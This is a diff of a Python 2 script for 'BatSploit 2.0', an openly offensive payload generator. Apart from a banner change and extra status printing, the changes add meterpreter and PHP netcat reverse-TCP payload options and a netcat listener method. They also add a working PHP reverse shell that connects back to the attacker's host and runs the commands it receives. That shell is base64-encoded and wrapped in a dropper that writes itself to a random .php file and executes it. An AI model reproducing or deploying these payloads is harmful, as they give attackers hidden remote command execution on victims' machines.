@@ -32,17 +32,24 @@ class BatSploit(object):
 		else:
 			os.system("clear") # if linux or mac
 		print ""
-		sys.stdout.write(colored("     _{___{__}\n", "white"))
-		sys.stdout.write(colored("    {_}      `\)\n", "white"))           
-		sys.stdout.write(colored("   {_}        `            _.-''''--.._\n", "white"))
-		sys.stdout.write(colored("   {_}                    //'.--.  \___`.\n", "white"))
-		sys.stdout.write(colored("    { }__,_.--~~~-~~~-~~-::.---. `-.\  `.)\n", "white"))
-		sys.stdout.write(colored("     `-.{_{_{_{_{_{_{_{_//  -- 8;=- `\n", "white"))
-		sys.stdout.write(colored("        `-:,_.:,_:,_:,.`\\._ ..'=- , \n", "white"))
-		sys.stdout.write(colored("            // // // //`-.`\`   .-'/\n", "white"))
-		sys.stdout.write(colored("  BatSploit 2.0", "green"))
-		sys.stdout.write(colored(" << << << <<    \ `--'  /---)\n", "white"))
-		sys.stdout.write(colored("            ^  ^  ^  ^     `-.....--'''\n", "white"))
+		#sys.stdout.write(colored("     _{___{__}\n", "white"))
+		#sys.stdout.write(colored("    {_}      `\)\n", "white"))           
+		#sys.stdout.write(colored("   {_}        `            _.-''''--.._\n", "white"))
+		#sys.stdout.write(colored("   {_}                    //'.--.  \___`.\n", "white"))
+		#sys.stdout.write(colored("    { }__,_.--~~~-~~~-~~-::.---. `-.\  `.)\n", "white"))
+		#sys.stdout.write(colored("     `-.{_{_{_{_{_{_{_{_//  -- 8;=- `\n", "white"))
+		#sys.stdout.write(colored("        `-:,_.:,_:,_:,.`\\._ ..'=- , \n", "white"))
+		#sys.stdout.write(colored("            // // // //`-.`\`   .-'/\n", "white"))
+		#sys.stdout.write(colored("  BatSploit 2.0", "green"))
+		#sys.stdout.write(colored(" << << << <<    \ `--'  /---)\n", "white"))
+		#sys.stdout.write(colored("            ^  ^  ^  ^     `-.....--'''\n", "white"))
+		print colored(" _____________", "white")
+		print colored("<", "white") + colored(" BatSploit 2 ", "green") + colored(">", "white")
+		print colored(" -------------", "white")
+		print colored("       \   ,__,", "white")
+		print colored("        \  (oo)____", "white")
+		print colored("           (__)    )\\", "white")
+		print colored("              ||--|| *", "white")
 		sys.stdout.write(colored("\n @Author : Daniel Victor Freire\n", "grey"))
 		sys.stdout.write(colored(" @Version : 2.0.0\n", "grey"))
 		sys.stdout.write(colored(" <danielfreire56@hotmail.com>\n", "grey"))
@@ -93,7 +100,7 @@ class BatSploit(object):
 	def list_payloads(self):
 		# essa função lista os payloads
 		print "\n[!] Payloads List"
-		payloads = ['python/netcat_reverse_tcp', 'python/batsploit_reverse_tcp', 'windows/netcat_reverse_tcp', 'linux/netcat_reverse_tcp', 'php/socket_reverse_tcp'] # tupple contendo os payloads
+		payloads = ['python/netcat_reverse_tcp', 'python/batsploit_reverse_tcp', 'python/meterpreter_reverse_tcp', 'windows/netcat_reverse_tcp', 'linux/netcat_reverse_tcp', 'php/socket_reverse_tcp', 'php/netcat_reverse_tcp'] # tupple contendo os payloads
 		for payload in payloads:
 			sys.stdout.write(colored("\n[+] ", "green"))
 			sys.stdout.write(colored(payload, "white"))
@@ -114,6 +121,18 @@ class BatSploit(object):
 			os.system("start handler.py %s %s"%(host, port))
 		elif self.platform == "Linux":
 			os.system("gnome-terminal python handler.py %s %s"%(host, port))
+
+	def nc_bind(self, lhost, lport):
+		# isso escuta as conecxoes com netcat
+		host = lhost.split("=")[1]
+		port = lport.split("=")[1]
+		sys.stdout.write(colored("\n ======", "green"))
+		sys.stdout.write(colored(" Handler started at %s:%s "%(host, port), "white"))
+		sys.stdout.write(colored("======\n", "green"))
+		if self.platform == "Windows":
+			os.system("start nc.exe -nvlp %s"%(port))
+		elif self.platform == "Linux":
+			os.system("gnome-terminal nc -nvlp %s"%(port))
 
 	def create_payload(self, payload, lhost, lport, name):
 		host = lhost.split("=")[1] # local host para o payload se conectar
@@ -137,6 +156,10 @@ class BatSploit(object):
 			size_payload = os.path.getsize(name) # tamanho do payload
 			sys.stdout.write(colored("\n[+] ", "green"))
 			sys.stdout.write(colored("Payload was created ! \n", "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
 			sys.stdout.write(colored("Name : %s "%(name), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
@@ -165,8 +188,11 @@ class BatSploit(object):
 			payload_file.write(payload_coded) # escreve o código no arquivo
 			payload_file.close() # fecha o arquivo
 			size_payload = os.path.getsize(name) # tamanho do payload
-			sys.stdout.write(colored("\n[+] ", "green"))
 			sys.stdout.write(colored("Payload was created ! \n", "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
 			sys.stdout.write(colored("Name : %s "%(name), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
@@ -189,8 +215,11 @@ class BatSploit(object):
 			payload_file.write(code) # escreve o código no arquivo
 			payload_file.close() # fecha o arquivo
 			size_payload = os.path.getsize(name) # tamanho do payload
-			sys.stdout.write(colored("\n[+] ", "green"))
 			sys.stdout.write(colored("Payload was created ! \n", "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
 			sys.stdout.write(colored("Name : %s "%(name), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
@@ -209,8 +238,11 @@ class BatSploit(object):
 			payload_file.write(code) # escreve o código no arquivo
 			payload_file.close() # fecha o arquivo
 			size_payload = os.path.getsize(name) # tamanho do payload
-			sys.stdout.write(colored("\n[+] ", "green"))
 			sys.stdout.write(colored("Payload was created ! \n", "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
 			sys.stdout.write(colored("Name : %s "%(name), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
@@ -234,8 +266,11 @@ class BatSploit(object):
 			payload_file.write(code) # escreve o código no arquivo
 			payload_file.close() # fecha o arquivo
 			size_payload = os.path.getsize(name) # tamanho do payload
-			sys.stdout.write(colored("\n[+] ", "green"))
 			sys.stdout.write(colored("Payload was created ! \n", "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
 			sys.stdout.write(colored("Name : %s "%(name), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
@@ -247,6 +282,7 @@ class BatSploit(object):
 			elif self.platform == "Linux":
 				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
 		elif payload == 'python/meterpreter_reverse_tcp':
+			# code ...
 			code = "import socket,struct\n"
 			code += "s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
 			code += "s.connect(('%s', %i))\n"%(host, port)
@@ -262,6 +298,36 @@ class BatSploit(object):
 			size_payload = os.path.getsize(name) # tamanho do payload
 			sys.stdout.write(colored("\n[+] ", "green"))
 			sys.stdout.write(colored("Payload was created ! \n", "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("Name : %s "%(name), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
+			if self.platform == "Windows":
+				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
+			elif self.platform == "Linux":
+				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
+		elif payload == 'php/netcat_reverse_tcp':
+			# code ...
+			code = "<?php $s=fsockopen('%s',%i);while($s): fwrite($s, fread(popen(fread($s, 1024), 'r'), 20000)); endwhile;?>"%(host, port)
+			encode = code.encode('base64').replace("\n", "")
+			payload_coded = "<?php $string=base64_decode('%s');\n"%(encode)
+			payload_coded += "$new_file=md5(uniqid()).'.php';$h=fopen($new_file,'w');fwrite($h,$string);exec('php '.$new_file);?>"
+			payload_file = open(name, 'w') # abri o arquivo dst
+			payload_file.write(payload_coded)
+			payload_file.close() # fecha o arquivo
+			size_payload = os.path.getsize(name) # tamanho do payload
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("Payload was created ! \n", "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
 			sys.stdout.write(colored("Name : %s "%(name), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
